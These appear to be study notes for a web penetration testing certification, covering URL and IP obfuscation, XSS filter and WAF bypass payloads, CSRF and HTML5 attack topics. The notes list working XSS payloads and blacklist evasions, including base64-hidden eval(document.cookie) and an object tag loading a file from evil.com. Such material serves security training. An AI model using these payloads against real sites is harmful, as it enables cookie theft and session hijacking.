# eWPTx (Web Penetration Testing xTreme)

## Module 1

### Data Encoding Basics
> URL encoding
* Safe Characters -> [0-9a-zA-Z] and $-.+!()'_* and  reserved chars
* ASCII Control Controls -> ISO-8859-1 (ISO LATIN - 00-1F hex [0-31 decimal])
* Non-ASCII Characters -> Top half of ISO latin (80-FF hex [128-255 decimal])
* Reserved Characters -> $&+,/:;=?@
* Unsafe Characters -> "<>#%{}|^~[]`\`

> HTML encoding
> Base 32|64 encoding
> Unicode encoding


## Module 2 

### Evasions

#### Base64 Encoding Evasion
* Specific keywords like alert, eval, prompt, document.cookie etc are blaclisted so encode them  

Ex ->> eval(document.cookie) --> eval(atob(ZG9jdW1lbnQuY29va2ll))
Eval can be blacklisted so instead use --> [].constructor.constructor("code")()

Ex ->> eval(document.cookie) --> [].constructor.constructor("atob(ZG9jdW1lbnQuY29va2ll)")()

### URL Obfuscation Techniques
> URL Shortner 
* If `https://example.com` is not allowed use URL shortners like bitly.com (ex. bit.ly/5475 or j.mp/5874), tinyurl.com, tiny.cc etc to bypass it.

> URL Hostname Obfuscation
* Normal URLs are like `https://example.com/s/#n:xss` but RFC_3986 says `https://_[valid_too]_@example.com` is valid too.
> URL Authority Obfuscation
* Structure :
foo://example.com:8080/over/here?name=legend#killer
In general :
scheme://authority/path/path?query#fragment

Ex ->> http://username:password@example.com/protected_path and http://www.google.com@example.com/t/xss

If no such auth mechanism is present the text before authority is ignored.

* DWORD - Double Word also known as Integer IP. Google IP 216.58.215.78 translate to 3627734862 and can be accessed at -> http://3627734862
* OCTAL - Google IP can be represented in Octal form like http://0330.0072.0327.0116 and we can feed leading zeros http://00000330.00000072.00000327.00000116
* HEXADECIMAL - Google IP can be represented in Hexadecimal like http://0xd83ad74e, also can be http://0xd8.0x3a.0xd7.0x4e, we can also add leading zeros http://0x000000d8.0x0000003a.0x000000d7.0x0000004e

#### Java Obfuscation Techniques
* Techniques ->> JJencode and Aaencode from JSFuck
* Minifying (Closure compiler, YUICompressor, JSMin, Packer)

#### PHP Obfuscation Techniques
* Type Juggling
* Single (No escapes) vs Double (escapes) quotes
* Curly brackets {$var} for variable parsing --> {$var}, ${var}, {${var}} etc
* Heredoc (for double quotes) vs Nowdoc (for single quotes) 

## Module 3 

### XSS - Cross Site Scripting
* Types ->> Stored, Reflected, DOM, Universal

## Module 4 

### XSS - Cross Site Scripting - Filter evasion and Waf bypass
* Bypass Weak `<script>` tag bans
	- `<ScRiPt>alert();</ScRiPt>`
	- `<ScRiPt>alert();`
	- `<scr\x00ipt>alert()</scr\x00ipt>`
* Don't use `<script>` tags.. Use HTML attributes
	- `<a href="javascript:alert(1)">show></a>`
	- `<form action="javascript:alert(1)"><button>send</button></form>`
	- `<object data="//evil.com/xss.swf">`
	- `<img src=x onerror=alert(1)>`
	- `<svg//////onload=alert(1)>`
	- `<svg/onload=alert(1)>`
* Character Escaping
	- Instead of `alert` use `prompt`, `confirm` etc.
	- Character Unicode --> `<script>\u0061lert(1)</script>`
	- Decimal , Octal or Hexadecimal Encode --> `<img src=x onerror="eval('\x61lert')"/>`
	- Constructing Strings --> `/ale/.source+/rt/.source` and `atob("YWxlcq==")` and `17795081..toString(36)`
	- Pseudo-protocols 
		-- Data --> `<object data="data:text/html,<script>alert(1)</script>">` , if "data:" word is blocked use `DaTa:` or `data&colon;`
		-- vbscript --> `<img src=a onerror="vbscript:msgbox 1"/>` or `<iMg src=a onErRor="vBsCriPt:AlErT(4)"/>`

* Bypass Santization 
	- Not checked recursively --> is `<script>` is blocked try `<scr<script>ipt>alert(1)</script>`
	- Checked only once --> `<scr<iframe>ipt>alert(1)</script>`
	- Escape apostrophe `'` use `\'`, escape backslash `\'` use `\\'`  


## Module 5

### CSRF Recap
* CSRF forces web applications to perform arbitary operations on behalf of the attacker.
* Web application is vuln to CSRF only if :
	- Application relies on HTTP Cookies and Basic Authentication for tracking sessions.
	- No uncontrollable paramters are present.
	- Sensitive action can be performed.
	

## Module 6

### HTML 5
* Attack Scenarios - Session Hijacking, User Tracking, Disclosure of Confidential Data etc.
* SOP, CORS 
* XSS, Shell of the Future
* Cross Directory attacks
* IndexedDB vs WebSQL Database
* Browser-Based Botnet - Infect and Manage Persistence
* CSP 
* UI Redressing - x-Jacking Art, ClickJacking, LikeJacking, StrokeJacking,   


## Module 7

### SQL Injection


